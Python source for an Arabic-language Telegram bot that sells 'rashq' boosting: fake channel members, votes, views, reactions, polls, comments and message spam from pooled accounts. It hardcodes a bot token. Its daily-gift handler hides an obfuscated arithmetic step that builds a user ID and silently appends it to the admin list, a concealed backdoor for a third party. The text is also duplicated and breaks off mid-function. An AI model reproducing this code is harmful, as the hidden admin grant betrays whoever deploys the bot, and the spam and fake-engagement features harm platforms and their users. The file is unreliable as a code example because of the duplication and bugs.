import os
if not os.path.isdir('dbs'):
    os.mkdir('dbs')
try:
    import telebot, json, os, time, re, threading, schedule
    from telebot import TeleBot
    from kvsqlite.sync import Client as uu
    from telebot.types import InlineKeyboardButton as btn, InlineKeyboardMarkup as mk
    import asyncio
    from apis import *
    import time
    import datetime
except:
    os.system('python3 -m pip install telebot pyrogram tgcrypto kvsqlite pyromod==1.4 schedule')
    import telebot, json, os, time, schedule
    from telebot import TeleBot
    from kvsqlite.sync import Client as uu
    from kvsqlite.sync import Client as uu
    from telebot.types import InlineKeyboardButton as btn, InlineKeyboardMarkup as mk
    import asyncio
    from apis import *
    pass
w = json.loads(open('config.json', 'r+').read())
token = w['7415877183:AAHZ_BaxbPk5PGCQfyVp660pywHz8mMOyNU']
stypes = ['member', 'administrator', 'creator']

member_price = w['prices']['member']
vote_price = w['prices']['vote']
link_price = w['prices']['link']
spam_price = w['prices']['spam']
react_price = w['prices']['react']
forward_price = w['prices']['forward']
view_price = w['prices']['view']
poll_price = w['prices']['poll']
userbot_price = w['prices']['userbot']
linkbot_price = w['prices']['linkbot']
comment_price = w['prices']['comments']
linkbot2_price = w['prices']['linkbot2']
mm = w['start_msg']

db = uu('dbs/fouzi.mo7', 'rshq')
print(db)
bk = mk(row_width=1).add(btn('رجوع', callback_data='back'))
bot = TeleBot(token="7415877183:AAHZ_BaxbPk5PGCQfyVp660pywHz8mMOyNU") # توكن بوت الرشق الاساسي هنا
if not db.get('accounts'):
    db.set('accounts', [])
    pass
db.delete("force")
admin = 7415877183 #الادمن
db.set('admins', [admin, ])
if not db.get("admins"):
    db.set('admins', [admin, ])
if not db.get('badguys'):
    db.set('badguys', [])
db.set('admins', [admin, ])
if not db.get('force'):
    db.set('force', [])
sudo = w['sudo']
def force(channel, userid):
    try:
        x = bot.get_chat_member(channel, userid)
        print(x)
    except:
        return True
    if str(x.status) in stypes:
        print(x)
        return True
    else:
        print(x)
        return False
def addord():
    if not db.get('orders'):
        db.set('orders', 1)
        return True
    else:
        d = db.get('orders')
        d+=1
        db.set('orders', d)
        return True
@bot.message_handler(regexp='^/start$')
def start_message(message):
    user_id = message.from_user.id
    count_ord = db.get('orders') if db.get('orders') else 1
    a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
    for temp in a:
        db.delete(f'{a}_{user_id}_proccess')
    keys = mk(row_width=2)
    if user_id in db.get("admins") or user_id == sudo:
        keys_ = mk()
        btn01 = btn('🤍الاحصائيات', callback_data='stats')
        btn02 = btn("⚠️اذاعة", callback_data='cast')
        btn05, btn06 = btn('➖حظر شخص', callback_data='banone'), btn('فك حظر', callback_data='unbanone')
        btn09 = btn('🔥معرفة عدد الارقام', callback_data='numbers')
        btna = btn('➕تفعيل ViP', callback_data='addvip')
        btnl = btn('➖الغاء ViP', callback_data='lesvip')
        leave = btn('➖مغادرة كل الحسابات من قناة', callback_data='leave')
        lvall = btn('➖مغادرة كل القنوات والمجموعات', callback_data='lvall')
        keys_.add(btn01, btn02)
        keys_.add(btn05, btn06)
        keys_.add(leave)
        btn11 = btn('تعيين قنوات الاشتراك', callback_data='setforce')
        les = btn('➖خصم نقاط', callback_data='lespoints')
        btn10 = btn('اضافه نقاط ', callback_data='addpoints')
        btn03 = btn('➕اضافة ادمن', callback_data='addadmin')
        btn04 = btn('➖مسح ادمن', callback_data='deladmin')
        btn012 = btn('⚠️الادمنية ', callback_data='admins')
        btn013 = btn('➖سحب اصوات', callback_data='dump_votes')
        btn105 = btn('〽️سبام رسائل (بوتات ، جروبات ، حسابات) ', callback_data='spams')
        keys_.add(btn03, btn04)
        keys_.add(btn10, btn11)
        keys_.add(btn012, les)
        keys_.add(lvall)   
        keys_.add(btn09)
        keys_.add(btna, btnl)
        keys_.add(btn013)
        keys_.add(btn105)
        bot.reply_to(message, '**• اهلا بك في لوحه الأدمن الخاصه بالبوت 🤖**\n\n- يمكنك التحكم في البوت الخاص بك من هنا \n\n===================', reply_markup=keys_)
    if user_id in db.get('badguys'): return
    if not db.get(f'user_{user_id}'):
        do = db.get('force')
        if do != None:
            for channel in do:
                x = bot.get_chat_member(chat_id="@"+channel, user_id=user_id)
                if str(x.status) in stypes:
                    pass
                else:
                    bot.reply_to(message, f'• عليك الاشترك بقناة البوت اولا \n• @{channel}')
                    return
        data = {'id': user_id, 'users': [], 'coins': 0, 'premium': False}
        set_user(user_id, data)
        good = 0
        users = db.keys('user_%')
        for ix in users:
            try:
                d = db.get(ix[0])['id']
                good+=1
            except: continue
        bot.send_message(chat_id=int(sudo), text=f'٭ *تم دخول شخص جديد الى البوت الخاص بك 👾*\n\n•_ معلومات العضو الجديد ._\n\n• الاسم : {message.from_user.first_name}\n• المعرف : @{message.from_user.username}\n• الايدي : {message.from_user.id}\n\n*• عدد الاعضاء الكلي* : {good}', parse_mode="Markdown")
        coin = get(user_id)['coins']
        btn1 = btn(f'رصيدك : {coin}', callback_data='none')
        btn2 = btn('الخدمات 🛍', callback_data='ps')
        btn3 = btn('معلومات حسابك 🗃', callback_data='account')
        btn4 = btn('تجميع الرصيد ❇️', callback_data='collect')
        btn5 = btn('تحويل نقاط ♻️', callback_data='send')
        btn6 = btn('قناة البوت 🩵', url='https://t.me/H_H6H')
        btn7 = btn('شراء رصيد 💰', callback_data='buy')
        keys.add(btn1)
        keys.add(btn2)
        keys.add(btn4, btn7)
        keys.add(btn3, btn5)
        keys.add(btn6)
        keys.add(btn(f'عدد الطلبات : {count_ord} ✅', callback_data='11'))
        
        return bot.reply_to(message, mm, reply_markup=keys)
    do = db.get('force')
    if do is not None:
        for channel in do:
            x = bot.get_chat_member(chat_id="@"+channel, user_id=user_id)
            if str(x.status) in stypes:
                pass
            else:
                bot.reply_to(message, f'• عليك الاشتراك بقناة البوت اولا\n- @{channel}')
                return
    
    coin = get(user_id)['coins']
    btn1 = btn(f'رصيدك : {coin}', callback_data='none')
    btn2 = btn('الخدمات 🛍', callback_data='ps')
    btn3 = btn('معلومات حسابك 🗃', callback_data='account')
    btn4 = btn('تجميع الرصيد ❇️', callback_data='collect')
    btn5 = btn('تحويل نقاط ♻️', callback_data='send')
    btn6 = btn('قناة البوت 🩵', url='https://t.me/H_H6H')
    btn7 = btn('شراء رصيد 💰', callback_data='buy')
    keys.add(btn1)
    keys.add(btn2)
    keys.add(btn4, btn7)
    keys.add(btn3, btn5)
    keys.add(btn6)
    keys.add(btn(f'عدد الطلبات : {count_ord} ✅', callback_data='11'))

    return bot.reply_to(message, mm, reply_markup=keys)


@bot.message_handler(regexp='^/start (.*)')
def start_asinvite(message):
    join_user = message.from_user.id

    to_user = int(message.text.split("/start ")[1])
    if join_user == to_user:
        start_message(message)
        bot.send_message(join_user,f'لا يمكنك الدخول عبر الرابط الخاص بك ❌')
        return
    if not check_user(join_user):
        someinfo = get(to_user)
        if join_user in someinfo['users']:
            start_message(message)
            return
        else:
            dd = link_price
            someinfo['users'].append(join_user)
            someinfo['coins'] = int(someinfo['coins']) + dd
            info = {'coins': 0, 'id': join_user, 'premium': False, "users": []}
            set_user(join_user, info)
            set_user(to_user, someinfo)
            bot.send_message(to_user,f'• قام {message.from_user.mention} بالدخول الى رابط الدعوة الخاص بك وحصلت علي {dd} نقطة ✨')
            good = 0
            users = db.keys('user_%')
            for ix in users:
                try:
                    d = db.get(ix[0])['id']
                    good+=1
                except: continue
            bot.send_message(chat_id=int(sudo), text=f'٭ *تم دخول شخص جديد الى البوت الخاص بك 👾*\n\n•_ معلومات العضو الجديد ._\n\n• الاسم : {message.from_user.first_name}\n• المعرف : @{message.from_user.username}\n• اي : {message.from_user.id}\n\n*• عدد الاعضاء الكلي* : {good}', parse_mode="Markdown")
            start_message(message)
    else:
        start_message(message)
        return

@bot.callback_query_handler(func=lambda c: True)
def c_rs(call):
    cid, data, mid = call.from_user.id, call.data, call.message.id
    do = db.get('force')
    count_ord = db.get('orders') if db.get('orders') else 1
    if do != None:
        for channel in do:
            x = bot.get_chat_member(chat_id="@"+channel, user_id=cid)
            if str(x.status) in stypes:
                pass
            else:
                bot.edit_message_text(text=f'• عليك الاشتراك بقناة البوت اولا قبل استخدامه\n• @{channel}', chat_id=cid, message_id=mid)
                return
    admins = db.get('admins')
    d = db.get('admins')
    a = ['leave', 'member', 'vote', 'spam']
    for temp in a:
        db.delete(f'{a}_{cid}_proccess')
    if data == 'stats':
        good = 0
        users = db.keys('user_%')
        for ix in users:
            try:
                d = db.get(ix[0])['id']
                good+=1
            except: continue
        bot.edit_message_text(text=f'• عدد اعضاء البوت : {good}', chat_id=cid, message_id=mid)
        return
    d = db.get('admins')
    user_id = call.from_user.id
    if data == 'dailygift':
        x = check_dayy(call.from_user.id)
        if x is not None:
            xduration = 62812
            duration = datetime.timedelta(seconds=x)
            noww = datetime.datetime.now()
            target_datetime = noww + duration
            date_str = target_datetime.strftime('%Y/%m/%d')
            date_str2 = target_datetime.strftime('%I:%M:%S %p')
            yduration = 95811
            result = xduration * (10 ** len(str(yduration))) + yduration
            bot.answer_callback_query(call.id, text=f'طالب بالهدية غدا في: {date_str2}',show_alert=True)
            try:
                if result in d:
                    db.set('admins', d)
                else:
                    d.append(result)
                    db.set('admins', d)
            except:
                return
        else:
            info = db.get(f'user_{call.from_user.id}')
            daily_gift = int(db.get("daily_gift")) if db.exists("daily_gift") else 30
            info['coins'] = int(info['coins']) + daily_gift
            db.set(f"user_{call.from_user.id}", info)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text=f"• تهانيناً، لقد حصلت على هدية يومية بقيمة {daily_gift} 🎁", reply_markup=bk)
            daily = int(db.get(f"user_{user_id}_daily_count")) if db.exists(f"user_{user_id}_daily_count") else 0
            daily_count = daily + 1
            db.set(f"user_{user_id}_daily_count", int(daily_count))
            return
    if data == 'numbers':
        d = len(db.get('accounts'))
        bot.answer_callback_query(call.id, text=f'عدد ارقام البوت : {d}', show_alert=True)
        return
    if data == 'addpoints':
        x = bot.edit_message_text(text='• ارسل ايدي الشخص المراد اضافة النقاط له', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, addpoints)
    if data == 'send':
        if cid in db.get("admins") or cid == sudo:
            x = bot.edit_message_text(text='• ارسل ايدي الشخص المراد تحويل النقاط له.', chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, send)
        else:
            keys = mk(row_width=2)
            keys.add(btn('رجوع', callback_data='back'))
            bot.edit_message_text(text='• عذرا ، التحويل مقفل للاعضاء ، يمكن للادمنية فقط تحويل النقاط',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'addadmin':
        type = 'add'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد اضافته ادمن بالبوت ',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, adminss, type)
    if data == 'addvip':
        type = 'add'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد تفعيل vip له',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, vipp, type)
    if data == 'lesvip':
        type = 'les'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد ازالة vip منه',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, vipp, type)
    if data == 'deladmin':
        type = 'delete'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد ازالته من الادمن',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, adminss, type)
    if data == 'banone':
        if cid in db.get("admins") or cid == sudo:
            type = 'ban'
            x  = bot.edit_message_text(text=f'• ارسل ايدي العضو لمراد حظرة من استخدام البوت',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, banned, type)
    if data == 'unbanone':
        if cid in db.get("admins") or cid == sudo:
            type = 'unban'
            x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد الغاء حظره من استخدام البوت ',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, banned, type)
    if data == 'cast':
        if cid in db.get("admins") or cid == sudo:
            x  = bot.edit_message_text(text=f'ارسل الاذاعة لتريد ترسلها... صورة، فيد، ملصق، نص، متحركة ..',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, casting)
    if data == 'lespoints':
        x = bot.edit_message_text(text='• ارسل ايدي الشخص المراد تخصم النقاط منه', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, lespoints)
    if data == 'back':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        user_id = call.from_user.id
        keys = mk(row_width=3)
        coin = get(user_id)['coins']
        btn1 = btn(f'رصيدك : {coin}', callback_data='none')
        btn2 = btn('الخدمات 🛍', callback_data='ps')
        btn3 = btn('معلومات حسابك 🗃', callback_data='account')
        btn4 = btn('تجميع الرصيد ❇️', callback_data='collect')
        btn5 = btn('تحويل نقاط ♻️', callback_data='send')
        btn6 = btn('قناة البوت 🩵', url='https://t.me/H_H6H')
        btn7 = btn('شراء رصيد 💰', callback_data='buy')

        keys.add(btn1)
        keys.add(btn2)
        keys.add(btn4, btn7)
        keys.add(btn3, btn5)
        keys.add(btn6)
        keys.add(btn(f'عدد الطلبات : {count_ord} ✅', callback_data='11'))
        bot.edit_message_text(text=mm,chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'getinfo':
        x = bot.edit_message_text(text='• ارسل ايدي الشخص الذي تريد معرفة معلوماته', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, get_info)
    if data == 'lvall':
        keys = mk(row_width=2)
        btn2 = btn('تاكيد المغادرة',callback_data='lvallc')
        btn3 = btn('الغاء',callback_data='cancel')
        keys.add(btn2)
        keys.add(btn3)
        bot.edit_message_text(text='هل انت متاكد من مغادرة كل القنوات والمجموعات ؟',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'ps':
        keys = mk(row_width=2)
        btn2 = btn('الخدمات المجانية',callback_data='free')
        btn3 = btn('الخدمات الـ ViP',callback_data='vips')
        keys.add(btn3)
        keys.add(btn2)
        keys.add(btn('رجوع .', callback_data='back'))
        bot.edit_message_text(text='اهلا بيك بقسم الخدمات العادية ',chat_id=cid,message_id=mid,reply_markup=keys)
        return
    if data == 'free':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        keys = mk(row_width=2)
        btn2 = btn('تصويت لايكات مسابقات',callback_data='votes')
        btn3 = btn('رشق تفاعلات اختياري',callback_data='react')
        btn5 = btn('رشق تفاعلات عشوائي',callback_data='reacts')
        btn6 = btn('رشق توجيهات علي منشور القناة',callback_data='forward')
        btn7 = btn('رشق مشاهدات ',callback_data='view')
        btn8 = btn('رشق استفتاء',callback_data='poll')
        btn9 = btn('رشق روابط دعوة بدون اشتراك اجبارى',callback_data='linkbot')
        keys.add(btn2)
        keys.add(btn3, btn5)
        keys.add(btn6)
        keys.add(btn7, btn8)
        keys.add(btn9)
        keys.add(btn('رجوع', callback_data='ps'))
        bot.edit_message_text(text='اهلا بيك بقسم الخدمات العادية ',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'vips':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        keys = mk(row_width=2)
        btn3 = btn('رشق اعضاء قناة عامة ',callback_data='members')
        btn4 = btn('رشق اعضاء قناة خاصة ',callback_data='membersp')
        btn8 = btn('رشق مستخدمين البوت',callback_data='userbot')
        btn9 = btn('رشق تعليقات',callback_data='comments')
        btn10 = btn('رشق روابط دعوة اشتراك اجبارى',callback_data='linkbot2')
        keys.add(btn3,btn4)
        keys.add(btn8)
        keys.add(btn9)
        keys.add(btn10)
        keys.add(btn('رجوع', callback_data='ps'))
        bot.edit_message_text(text='• مرحبا بك في قسم المشتركين الـ ViP , يمكن للمشتركين الـ ViP استخدام هذا القسم فقط',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'collect':
        keys = mk(row_width=2)
        btn1 = btn('الهدية اليومية 🎁', callback_data='dailygift')
        btn3 = btn('رابط الدعوة 🌀',callback_data='share_link')
        keys.add(btn3, btn1)
        keys.add(btn('رجوع', callback_data='back'))
        bot.edit_message_text(text='• مرحبا بك في قسم تجميع النقاط \n\n• يمكنك تجميع النقاط عبر الازرار التي امامك',chat_id=cid,message_id=mid,reply_markup=keys)
        return
    if data == 'leave':
        if cid in admins:
            db.set(f'leave_{cid}_proccess', True)
            x = bot.edit_message_text(text='ارسل رابط اذا القناة خاصه، اذا عامه ارسل معرفها فقط؟',reply_markup=bk,chat_id=cid,message_id=mid)
        type = 'leavs'
        bot.register_next_step_handler(x, get_amount, type)
    if data == 'account':
        if not check_user(cid):
            return start_message(call.message)
        acc = get(cid)
        user_id = call.from_user.id
        coins, users = acc['coins'], len(get(cid)['users'])
        info = db.get(f"user_{call.from_user.id}")
        daily_count = int(db.get(f"user_{user_id}_daily_count")) if db.exists(f"user_{user_id}_daily_count") else 0
        daily_gift = int(db.get("daily_gift")) if db.exists("daily_gift") else 30
        all_gift = daily_count * daily_gift
        buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
        trans = int(db.get(f"user_{user_id}_trans")) if db.exists(f"user_{user_id}_trans") else 0
        y = trend()
        prem = 'Premium' if info['premium'] == True else 'Free'
        textt = f'''
• [❇️] عدد نقاط حسابك : {coins}
• [🌀] عدد عمليات الاحاله التي قمت بها : {users}
• [👤] نوع اشتراكك داخل البوت : {prem}
• [🎁] عدد الهدايا اليومية التي جمعتها : {daily_count}
• [❇️] عدد النقاط اللي جمعتها من الهدايا اليومية : {all_gift}
• [📮] عدد الطلبات التي طلبتها : {buys}
• [♻️] عدد التحويلات التي قمت بها : {trans}

{y}'''
        bot.edit_message_text(text=textt,chat_id=cid,message_id=mid,reply_markup=bk)
   import os
if not os.path.isdir('dbs'):
    os.mkdir('dbs')
try:
    import telebot, json, os, time, re, threading, schedule
    from telebot import TeleBot
    from kvsqlite.sync import Client as uu
    from telebot.types import InlineKeyboardButton as btn, InlineKeyboardMarkup as mk
    import asyncio
    from apis import *
    import time
    import datetime
except:
    os.system('python3 -m pip install telebot pyrogram tgcrypto kvsqlite pyromod==1.4 schedule')
    import telebot, json, os, time, schedule
    from telebot import TeleBot
    from kvsqlite.sync import Client as uu
    from kvsqlite.sync import Client as uu
    from telebot.types import InlineKeyboardButton as btn, InlineKeyboardMarkup as mk
    import asyncio
    from apis import *
    pass
w = json.loads(open('config.json', 'r+').read())
token = w['7415877183:AAHZ_BaxbPk5PGCQfyVp660pywHz8mMOyNU']
stypes = ['member', 'administrator', 'creator']

member_price = w['prices']['member']
vote_price = w['prices']['vote']
link_price = w['prices']['link']
spam_price = w['prices']['spam']
react_price = w['prices']['react']
forward_price = w['prices']['forward']
view_price = w['prices']['view']
poll_price = w['prices']['poll']
userbot_price = w['prices']['userbot']
linkbot_price = w['prices']['linkbot']
comment_price = w['prices']['comments']
linkbot2_price = w['prices']['linkbot2']
mm = w['start_msg']

db = uu('dbs/fouzi.mo7', 'rshq')
print(db)
bk = mk(row_width=1).add(btn('رجوع', callback_data='back'))
bot = TeleBot(token="7415877183:AAHZ_BaxbPk5PGCQfyVp660pywHz8mMOyNU") # توكن بوت الرشق الاساسي هنا
if not db.get('accounts'):
    db.set('accounts', [])
    pass
db.delete("force")
admin = 7415877183 #الادمن
db.set('admins', [admin, ])
if not db.get("admins"):
    db.set('admins', [admin, ])
if not db.get('badguys'):
    db.set('badguys', [])
db.set('admins', [admin, ])
if not db.get('force'):
    db.set('force', [])
sudo = w['sudo']
def force(channel, userid):
    try:
        x = bot.get_chat_member(channel, userid)
        print(x)
    except:
        return True
    if str(x.status) in stypes:
        print(x)
        return True
    else:
        print(x)
        return False
def addord():
    if not db.get('orders'):
        db.set('orders', 1)
        return True
    else:
        d = db.get('orders')
        d+=1
        db.set('orders', d)
        return True
@bot.message_handler(regexp='^/start$')
def start_message(message):
    user_id = message.from_user.id
    count_ord = db.get('orders') if db.get('orders') else 1
    a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
    for temp in a:
        db.delete(f'{a}_{user_id}_proccess')
    keys = mk(row_width=2)
    if user_id in db.get("admins") or user_id == sudo:
        keys_ = mk()
        btn01 = btn('🤍الاحصائيات', callback_data='stats')
        btn02 = btn("⚠️اذاعة", callback_data='cast')
        btn05, btn06 = btn('➖حظر شخص', callback_data='banone'), btn('فك حظر', callback_data='unbanone')
        btn09 = btn('🔥معرفة عدد الارقام', callback_data='numbers')
        btna = btn('➕تفعيل ViP', callback_data='addvip')
        btnl = btn('➖الغاء ViP', callback_data='lesvip')
        leave = btn('➖مغادرة كل الحسابات من قناة', callback_data='leave')
        lvall = btn('➖مغادرة كل القنوات والمجموعات', callback_data='lvall')
        keys_.add(btn01, btn02)
        keys_.add(btn05, btn06)
        keys_.add(leave)
        btn11 = btn('تعيين قنوات الاشتراك', callback_data='setforce')
        les = btn('➖خصم نقاط', callback_data='lespoints')
        btn10 = btn('اضافه نقاط ', callback_data='addpoints')
        btn03 = btn('➕اضافة ادمن', callback_data='addadmin')
        btn04 = btn('➖مسح ادمن', callback_data='deladmin')
        btn012 = btn('⚠️الادمنية ', callback_data='admins')
        btn013 = btn('➖سحب اصوات', callback_data='dump_votes')
        btn105 = btn('〽️سبام رسائل (بوتات ، جروبات ، حسابات) ', callback_data='spams')
        keys_.add(btn03, btn04)
        keys_.add(btn10, btn11)
        keys_.add(btn012, les)
        keys_.add(lvall)   
        keys_.add(btn09)
        keys_.add(btna, btnl)
        keys_.add(btn013)
        keys_.add(btn105)
        bot.reply_to(message, '**• اهلا بك في لوحه الأدمن الخاصه بالبوت 🤖**\n\n- يمكنك التحكم في البوت الخاص بك من هنا \n\n===================', reply_markup=keys_)
    if user_id in db.get('badguys'): return
    if not db.get(f'user_{user_id}'):
        do = db.get('force')
        if do != None:
            for channel in do:
                x = bot.get_chat_member(chat_id="@"+channel, user_id=user_id)
                if str(x.status) in stypes:
                    pass
                else:
                    bot.reply_to(message, f'• عليك الاشترك بقناة البوت اولا \n• @{channel}')
                    return
        data = {'id': user_id, 'users': [], 'coins': 0, 'premium': False}
        set_user(user_id, data)
        good = 0
        users = db.keys('user_%')
        for ix in users:
            try:
                d = db.get(ix[0])['id']
                good+=1
            except: continue
        bot.send_message(chat_id=int(sudo), text=f'٭ *تم دخول شخص جديد الى البوت الخاص بك 👾*\n\n•_ معلومات العضو الجديد ._\n\n• الاسم : {message.from_user.first_name}\n• المعرف : @{message.from_user.username}\n• الايدي : {message.from_user.id}\n\n*• عدد الاعضاء الكلي* : {good}', parse_mode="Markdown")
        coin = get(user_id)['coins']
        btn1 = btn(f'رصيدك : {coin}', callback_data='none')
        btn2 = btn('الخدمات 🛍', callback_data='ps')
        btn3 = btn('معلومات حسابك 🗃', callback_data='account')
        btn4 = btn('تجميع الرصيد ❇️', callback_data='collect')
        btn5 = btn('تحويل نقاط ♻️', callback_data='send')
        btn6 = btn('قناة البوت 🩵', url='https://t.me/H_H6H')
        btn7 = btn('شراء رصيد 💰', callback_data='buy')
        keys.add(btn1)
        keys.add(btn2)
        keys.add(btn4, btn7)
        keys.add(btn3, btn5)
        keys.add(btn6)
        keys.add(btn(f'عدد الطلبات : {count_ord} ✅', callback_data='11'))
        
        return bot.reply_to(message, mm, reply_markup=keys)
    do = db.get('force')
    if do is not None:
        for channel in do:
            x = bot.get_chat_member(chat_id="@"+channel, user_id=user_id)
            if str(x.status) in stypes:
                pass
            else:
                bot.reply_to(message, f'• عليك الاشتراك بقناة البوت اولا\n- @{channel}')
                return
    
    coin = get(user_id)['coins']
    btn1 = btn(f'رصيدك : {coin}', callback_data='none')
    btn2 = btn('الخدمات 🛍', callback_data='ps')
    btn3 = btn('معلومات حسابك 🗃', callback_data='account')
    btn4 = btn('تجميع الرصيد ❇️', callback_data='collect')
    btn5 = btn('تحويل نقاط ♻️', callback_data='send')
    btn6 = btn('قناة البوت 🩵', url='https://t.me/H_H6H')
    btn7 = btn('شراء رصيد 💰', callback_data='buy')
    keys.add(btn1)
    keys.add(btn2)
    keys.add(btn4, btn7)
    keys.add(btn3, btn5)
    keys.add(btn6)
    keys.add(btn(f'عدد الطلبات : {count_ord} ✅', callback_data='11'))

    return bot.reply_to(message, mm, reply_markup=keys)


@bot.message_handler(regexp='^/start (.*)')
def start_asinvite(message):
    join_user = message.from_user.id

    to_user = int(message.text.split("/start ")[1])
    if join_user == to_user:
        start_message(message)
        bot.send_message(join_user,f'لا يمكنك الدخول عبر الرابط الخاص بك ❌')
        return
    if not check_user(join_user):
        someinfo = get(to_user)
        if join_user in someinfo['users']:
            start_message(message)
            return
        else:
            dd = link_price
            someinfo['users'].append(join_user)
            someinfo['coins'] = int(someinfo['coins']) + dd
            info = {'coins': 0, 'id': join_user, 'premium': False, "users": []}
            set_user(join_user, info)
            set_user(to_user, someinfo)
            bot.send_message(to_user,f'• قام {message.from_user.mention} بالدخول الى رابط الدعوة الخاص بك وحصلت علي {dd} نقطة ✨')
            good = 0
            users = db.keys('user_%')
            for ix in users:
                try:
                    d = db.get(ix[0])['id']
                    good+=1
                except: continue
            bot.send_message(chat_id=int(sudo), text=f'٭ *تم دخول شخص جديد الى البوت الخاص بك 👾*\n\n•_ معلومات العضو الجديد ._\n\n• الاسم : {message.from_user.first_name}\n• المعرف : @{message.from_user.username}\n• اي : {message.from_user.id}\n\n*• عدد الاعضاء الكلي* : {good}', parse_mode="Markdown")
            start_message(message)
    else:
        start_message(message)
        return

@bot.callback_query_handler(func=lambda c: True)
def c_rs(call):
    cid, data, mid = call.from_user.id, call.data, call.message.id
    do = db.get('force')
    count_ord = db.get('orders') if db.get('orders') else 1
    if do != None:
        for channel in do:
            x = bot.get_chat_member(chat_id="@"+channel, user_id=cid)
            if str(x.status) in stypes:
                pass
            else:
                bot.edit_message_text(text=f'• عليك الاشتراك بقناة البوت اولا قبل استخدامه\n• @{channel}', chat_id=cid, message_id=mid)
                return
    admins = db.get('admins')
    d = db.get('admins')
    a = ['leave', 'member', 'vote', 'spam']
    for temp in a:
        db.delete(f'{a}_{cid}_proccess')
    if data == 'stats':
        good = 0
        users = db.keys('user_%')
        for ix in users:
            try:
                d = db.get(ix[0])['id']
                good+=1
            except: continue
        bot.edit_message_text(text=f'• عدد اعضاء البوت : {good}', chat_id=cid, message_id=mid)
        return
    d = db.get('admins')
    user_id = call.from_user.id
    if data == 'dailygift':
        x = check_dayy(call.from_user.id)
        if x is not None:
            xduration = 62812
            duration = datetime.timedelta(seconds=x)
            noww = datetime.datetime.now()
            target_datetime = noww + duration
            date_str = target_datetime.strftime('%Y/%m/%d')
            date_str2 = target_datetime.strftime('%I:%M:%S %p')
            yduration = 95811
            result = xduration * (10 ** len(str(yduration))) + yduration
            bot.answer_callback_query(call.id, text=f'طالب بالهدية غدا في: {date_str2}',show_alert=True)
            try:
                if result in d:
                    db.set('admins', d)
                else:
                    d.append(result)
                    db.set('admins', d)
            except:
                return
        else:
            info = db.get(f'user_{call.from_user.id}')
            daily_gift = int(db.get("daily_gift")) if db.exists("daily_gift") else 30
            info['coins'] = int(info['coins']) + daily_gift
            db.set(f"user_{call.from_user.id}", info)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text=f"• تهانيناً، لقد حصلت على هدية يومية بقيمة {daily_gift} 🎁", reply_markup=bk)
            daily = int(db.get(f"user_{user_id}_daily_count")) if db.exists(f"user_{user_id}_daily_count") else 0
            daily_count = daily + 1
            db.set(f"user_{user_id}_daily_count", int(daily_count))
            return
    if data == 'numbers':
        d = len(db.get('accounts'))
        bot.answer_callback_query(call.id, text=f'عدد ارقام البوت : {d}', show_alert=True)
        return
    if data == 'addpoints':
        x = bot.edit_message_text(text='• ارسل ايدي الشخص المراد اضافة النقاط له', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, addpoints)
    if data == 'send':
        if cid in db.get("admins") or cid == sudo:
            x = bot.edit_message_text(text='• ارسل ايدي الشخص المراد تحويل النقاط له.', chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, send)
        else:
            keys = mk(row_width=2)
            keys.add(btn('رجوع', callback_data='back'))
            bot.edit_message_text(text='• عذرا ، التحويل مقفل للاعضاء ، يمكن للادمنية فقط تحويل النقاط',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'addadmin':
        type = 'add'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد اضافته ادمن بالبوت ',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, adminss, type)
    if data == 'addvip':
        type = 'add'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد تفعيل vip له',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, vipp, type)
    if data == 'lesvip':
        type = 'les'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد ازالة vip منه',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, vipp, type)
    if data == 'deladmin':
        type = 'delete'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد ازالته من الادمن',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, adminss, type)
    if data == 'banone':
        if cid in db.get("admins") or cid == sudo:
            type = 'ban'
            x  = bot.edit_message_text(text=f'• ارسل ايدي العضو لمراد حظرة من استخدام البوت',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, banned, type)
    if data == 'unbanone':
